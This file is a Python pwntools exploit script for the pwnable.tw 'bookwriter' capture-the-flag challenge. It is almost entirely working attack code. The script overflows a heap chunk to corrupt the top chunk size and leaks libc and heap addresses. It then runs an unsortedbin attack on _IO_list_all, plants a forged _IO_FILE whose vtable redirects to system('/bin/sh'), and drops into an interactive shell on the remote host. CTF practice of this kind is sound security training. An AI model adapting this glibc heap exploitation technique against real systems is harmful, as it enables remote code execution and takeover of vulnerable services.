#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./bookwriter')
context.terminal = ["tilix","-a","session-add-right","-e"]

host = args.HOST or 'chall.pwnable.tw'
port = int(args.PORT or 10304)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak *0x{exe.entry:x}
continue
'''.format(**locals())

# -- Exploit goes here --
def choose(option):
    io.sendlineafter("Your choice :", str(option))

def create(size, content):
    print(f"create {str(size)}")
    choose(1)
    io.sendlineafter("Size of page :", str(size))
    io.sendafter("Content :", content)

def edit(idx, content):
    choose(3)
    io.sendlineafter("Index of page :", str(idx))
    io.sendafter("Content:", content)

def view(idx):
    choose(2)
    io.sendlineafter("Index of page :", str(idx))

libc = ELF("./libc.so.6")
io = start()
io.sendafter("Author :", "A"*0x40)

create(0x18, "A"*0x18)
edit(0, "B"*0x18)
edit(0, b"\x00"*0x18 + p64(0xfe1))
choose(4)
io.recvuntil("A"*0x40)
libc_leak = u64(io.recvline().strip(b"\n").ljust(8, b'\x00'))
io.sendlineafter("no:0) ", "0")
create(0x60  - 8, "E"*(8))     
create(0x60 - 8, "C"*(8))    
create(0x60 - 8, "D"*(8))    
create(0x60 - 8, "I"*(8))    
create(0x60 - 8, "F"*(8))    
create(0x60 - 8, "G"*(8))    
create(0x60 - 8, "H"*(8))    
create(0x20 - 8, "I"*(8))    
view(1)
io.recvuntil("E"*8)
libc.address = u64(io.recvline().strip(b"\n").ljust(8, b'\x00')) - 0x3c4188
edit(1, "C"*16)
view(1)
io.recvuntil("C"*16)
heap_base = u64(io.recvline().strip(b"\n").ljust(8, b'\x00')) - 0x20
print(hex(libc.address), hex(heap_base))

# A chunk's fd is ignored during a partial unlink.
# Set up the bk pointer of this free chunk to point near _IO_list_all.
# This way _IO_list_all is overwritten by a pointer to the unsortedbin during the unsortedbin attack.
# Ensure fp->_IO_write_ptr > fp->_IO_write_base.
# Ensure fp->_mode <= 0.
# For convenience place the pointer to system() in the last qword of the _IO_FILE struct,
# which is part of the _unused2 area.
# Set up the vtable pointer so that the __overflow entry overlaps this pointer.
# Use the overflow to write the fake _IO_FILE struct over the old top chunk.
# Set the first qword to "/bin/sh" so that _IO_OVERFLOW(fp, EOF) becomes the equivalent of system("/bin/sh").

fake_chunk = b'/bin/sh\x00'+p64(0x61)# heap meta data 0x61 is tha fake size that wud go to small bin
fake_chunk += p64(0xdeadbeef)+p64(libc.sym._IO_list_all-0x10)# fd bk
fake_chunk += p64(0) + p64(1) # _IO_write_ptr _IO_write_base
fake_chunk = fake_chunk.ljust(0xc0,b'\x00')
fake_chunk += p64(0) # mode

pay = b"\x00"*720
pay += fake_chunk
pay += p64(0)
pay += p64(0)

pay += p64(heap_base+0x3d8) # vtable 0x3b8
pay += p64(1)# 0x3c0
pay += p64(2)# 0x3c8
pay += p64(3)# 0x3d0
pay += p64(0)*3 # vtable 0x3d8
pay += p64(libc.sym.system) # <- overwrite _IO_OVERFLOW 0x3f0

edit(0, pay)
io.interactive()
